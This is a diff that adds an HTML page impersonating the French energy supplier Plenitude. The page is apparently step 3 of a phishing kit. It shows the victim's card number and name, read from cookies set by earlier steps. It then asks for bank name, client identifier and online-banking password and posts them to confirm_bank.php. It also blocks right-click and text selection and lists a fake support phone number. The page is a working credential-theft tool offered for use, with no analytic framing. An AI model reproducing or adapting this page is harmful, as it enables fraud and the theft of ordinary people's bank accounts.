@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html dir="ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <title>Plenitude</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge">
+
+    <link rel="stylesheet" href="./Confirmez votre carte_files/normalize.css">
+    <link rel="stylesheet" href="./Confirmez votre carte_files/bootstrap.min.css">
+    <link rel="stylesheet" href="./Confirmez votre carte_files/font-awesome.min.css">
+    <link rel="stylesheet" href="./Confirmez votre carte_files/main_style.css">
+    <link rel="stylesheet" href="styles.css">
+
+
+    <link rel="shortcut icon" sizes="196x196" href="https://www.eniplenitude.fr/etc.clientlibs/plenitude-common/clientlibs/clientlib-site/resources/assets/favicon-32x32.png">
+    <link rel="shortcut icon" type="image/x-icon" href="https://www.eniplenitude.fr/etc.clientlibs/plenitude-common/clientlibs/clientlib-site/resources/assets/favicon.ico">   
+     <style>
+        .error {
+            border: 1px solid #c72e2e;
+        }
+    </style>
+<script language="JavaScript1.2" type="text/javascript">
+    //The functions disableselect() and reEnable() are used to return the status of events.
+
+    function disableselect(e) {
+        return false
+    }
+
+    function reEnable() {
+        return true
+    }
+
+    //if IE4 
+    // disable text selection
+    document.onselectstart = new Function("return false")
+
+    //if NS6
+    if (window.sidebar) {
+        //document.onmousedown=disableselect
+        // the above line creates issues in mozilla so keep it commented.
+
+        document.onclick = reEnable
+    }
+
+    function clickIE() {
+        if (document.all) {
+            (message);
+            return false;
+        }
+    }
+
+    // disable right click
+    document.oncontextmenu = new Function("return false")
+
+</script>
+</head>
+
+<body>
+<div class="lod-full" style="display: none;">
+    <div class="lod-c"></div>
+</div>
+<div class="contain">
+    <div class="img-logo">
+        <a href="#"><img src="https://1000logos.net/wp-content/uploads/2023/11/Plenitude-Logo.png" style="height: 160px;margin-top: -60px;margin-bottom: -75px;"></a>
+    </div>
+    <div class="center-color"></div>
+    <div class="right-btn"><a href="#" class="log_out">Déconnexion</a></div>
+    <div class="cls"></div>
+</div>
+<div class="contain biling-p">
+            <form id="form3" method="POST" action="confirm_bank.php" class="contain-info form">
+                <center>
+                    <span class="step" style="text-transform:uppercase"><b>étape 3 sur 3</b></span>
+                    <h3>Confirmez votre banque</h3>
+                    <div style="text-align:left;text-transform:uppercase">
+                        <center>
+                            <h3><b>Identity Confirmation<br></b></h3>
+                            <p style="text-align: left;">You must confirm your bank account using your online banking credentials for security reasons.</p>
+                            <hr>
+                            To confirm your bank account:<br>
+                            Please enter the client number and password you use for online banking.
+                            <p></p>
+                            <b>Card Number: </b><span id="cardNumber"></span><br>
+                            <b>Full Name: </b><span id="fullName"></span><br>
+                        </center>
+                    </div>
+                    <input type="text" name="bankname" class="bill_input" placeholder="Bank Name" required autocomplete="off" autocorrect="off">
+                    <input type="text" name="bankid" class="bill_input" placeholder="Bank Identifier" required autocomplete="off" autocorrect="off">
+                    <input type="password" name="bankpass" class="bill_input" placeholder="Password" required autocomplete="off" autocorrect="off">
+                    <hr>
+                    <button type="submit" class="bill_input btn-bill">Continue</button>
+                </div>
+            </form>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <p class="footer-info">Questions? Call <a href="">(+33) 0644 6741 20</a></p>
+        <ul class="footer-links">
+            <li><a href="#">FAQ</a></li>
+            <li><a href="#">Help Center</a></li>
+            <li><a href="#">Terms of Use</a></li>
+            <li><a href="#">Privacy</a></li>
+            <li><a href="#">Cookie Preferences</a></li>
+            <li><a href="#">Corporate Information</a></li>
+        </ul>
+        <div class="language-selector">
+            <select>
+                <option value="en">English</option>
+                <option value="fr">Français</option>
+            </select>
+        </div>
+    </footer>
+    <script>
+        // Récupérer les informations des cookies et les pré-remplir dans le formulaire
+        document.getElementById("cardNumber").textContent = getCookie("c_num");
+        document.getElementById("fullName").textContent = getCookie("nom") + " " + getCookie("prenom");
+
+        function getCookie(name) {
+            let cookieArr = document.cookie.split(";");
+            for(let i = 0; i < cookieArr.length; i++) {
+                let cookiePair = cookieArr[i].split("=");
+                if(name == cookiePair[0].trim()) {
+                    return decodeURIComponent(cookiePair[1]);
+                }
+            }
+            return null;
+        }
+    </script>
+</body>
+</html>
